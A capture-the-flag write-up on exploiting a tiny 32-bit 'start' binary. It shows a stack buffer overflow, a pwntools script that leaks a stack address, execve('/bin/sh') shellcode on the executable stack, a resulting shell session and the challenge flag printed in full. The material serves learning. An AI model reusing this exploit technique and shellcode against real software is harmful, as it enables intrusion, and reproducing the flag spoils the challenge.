# Start Write-up
Alright so my first steps were to download the binary and open it up in ghidra. Opening it up in ghidra yielded nothing because the program was a super basic opcodes. With no libraries. This made it really hard for ghidra to figure out what the functions were really doing. This meant I would have to open it up in GDB to see what was happening in the dissassembly.

I first ran the program to see what it did. All it did was send a 20-byte message:
`Let's start the CTF:`
then it gave a prompt. It seemed like anything you sent in the prompt would exit the program.

I opened the binary in GDB to find exactly that. Looking at the functions I found "\_start" was where all the magic happened. It was very crude instructions in 32-bit. It looked a little bit like this:

![[Pasted image 20220113144304.png]]

I was interested in this part:
```
xor	ebx,ebx
mov	dl,0x3c
mov	al,0x3
int 0x80
```
This essentially called `read(0, ???, 0x3c)`
The ??? was confusing, but then I read up above `mov ecx,esp` which meant that ecx was representing the stack, so it would be `read(0, stack, 0x3c)`
This meant there was an easy buffer overflow, but not as easy as I originally imagined. Essentially the stack looked like this:
```
0xffffbf04 ◂— 0x2774654c ("Let'")
0xffffbf08 ◂— 0x74732073 ('s st')
0xffffbf0c ◂— 0x20747261 ('art ')
0xffffbf10 ◂— 0x20656874 ('the ')
0xffffbf14 ◂— 0x3a465443 ('CTF:')
0xffffbf18 —▸ 0x804809d (_exit)
```
So when the program ran it would overwrite the stack with your input up to `0x3c` bytes. So if you typed `blah` the stack would look like:
```
0xffffbf04 ◂— 0x68616c62 ("blah")
0xffffbf08 ◂— 0x74732073 ('s st')
0xffffbf0c ◂— 0x20747261 ('art ')
0xffffbf10 ◂— 0x20656874 ('the ')
0xffffbf14 ◂— 0x3a465443 ('CTF:')
0xffffbf18 —▸ 0x804809d (_exit)
```
This means that you would have to type 20 characters before you hit the return address.
`0x3c` = 60 so you have 60-20 = 40 bytes of buffer overflow. Thats a good amount. I ended up looking at the ROPgadgets to see what I could do to change the control flow of the program:
`$ ROPgadget --binary ./start` 
```
0x0804809b : adc al, 0xc3 ; pop esp ; xor eax, eax ; inc eax ; int 0x80 
0x0804808e : add al, 0xcd ; xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80 
0x08048099 : add esp, 0x14 ; ret 
0x08048086 : daa ; mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80 0x080480a0 : inc eax ; int 0x80 
0x0804808f : int 0x80 
0x0804809a : les edx, ptr [ebx + eax*8] ; pop esp ; xor eax, eax ; inc eax ; int 0x80 
0x08048095 : mov al, 3 ; int 0x80 
0x0804808d : mov al, 4 ; int 0x80 
0x0804808b : mov bl, 1 ; mov al, 4 ; int 0x80 
0x08048089 : mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80
0x08048093 : mov dl, 0x3c ; mov al, 3 ; int 0x80 
0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80 
0x0804809d : pop esp ; xor eax, eax ; inc eax ; int 0x80 
0x0804809c : ret 
0x08048090 : xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80 
0x0804809e : xor eax, eax ; inc eax ; int 0x80 
0x08048091 : xor ebx, ebx ; mov dl, 0x3c ; mov al, 3 ; int 0x80
```
Seeing this I realized my options were limited, but I decided to start trying things out. The first gadget I tried was: `0x080480a0 : inc eax ; int 0x80` since I knew it would change the function that gets called. What I got was `0x18 + 1` for my eax value which corresponded to the `stime` syscall. After trying different inputs I found that eax was being saved from the `read` function which would return the size of the input. Which was `0x18`. When I increased the size of the input, I could get different syscall codes untill I reached `0x3c`(the max read size). Looking at my options for possible syscalls led to nothing. So that idea was scrapped.

The next idea I had was to use shellcode in my input to run some code (maybe pop a shell). Looking at `vmmap` I realized that might be possible since the stack was executable. The addresses of the stack were randomized though, so I had to find a way to leak the stack. Looking at the ROPgadgets I saw this function:
`0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80`
Essentially this would print out 20 bytes from the stack. since we had already moved the stack pointer past the string that it gives, it would run: `write(1, stack, 0x14)` this is what my program looked like:
```python
#! /usr/bin/env python 
from pwn import * 
context.terminal = ['tmux', 'splitw', '-h']  
addr_ecx2 = 0x08048087
p = process("./start") 
gdb.attach(p, 'b _start') 
p.recv()
payload = b"A"*(0x14) 
payload += p32(addr_ecx2) 
p.send(payload) 
x = p.recv() 
print(hex(u32(x[0:4]))) 
print(hex(u32(x[4:8]))) 
print(hex(u32(x[8:12]))) 
p.interactive()
```
I was able to leak 3 addresses with one of them in the same page as the stack:(`x[0:4]`)
This was some really good news. It meant I could run shellcode directly. So I created a new program that would send Shellcode in my input and then send the program to that spot in the stack. This would be the control flow:
`_start` -> enter `"A"*0x14 + 0x08048087` -> `_start+39` = `0x08048087` -> read stack address -> enter `shellcode + stack address` -> `stack address`
The program I wrote did exactly that. My shellcode looked like this:
`"j\x0bXhn/shh//bi1\xc9\x99T[\xcd\x80"`
And it didn't work.

Why? The shellcode I thought was too long. I thought the shellcode was somehow breaking after like 10 characters. I spent an insane amount of time trying to get the shellcode to be small enough to fit into the space.
Then I looked really hard at what was happening. The instructions from my shellcode looked like this:
```
push $SYS_execve 
pop %eax
push $0
push $0x68732f6e 
push $0x69622f2f
xor %ecx, %ecx 
cltd 
push %esp 
pop %ebx 
int $0x80
```
I noticed that when the program got to `push $0x69622f2f` it would overwrite the rest of the shellcode. OF COURSE!!! The shellcode was on the stack and pushing values onto the stack would overwrite those values. 

All I had to do to solve it was place the shellcode at the end of my input so it would overwrite useless parts of the stack and boom! it worked:
```
$ ls
bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var
$ cd home
$ cd start
$ ls
flag
run.sh
start
$ cat flag
FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
```
The final expoit script is in this repo.
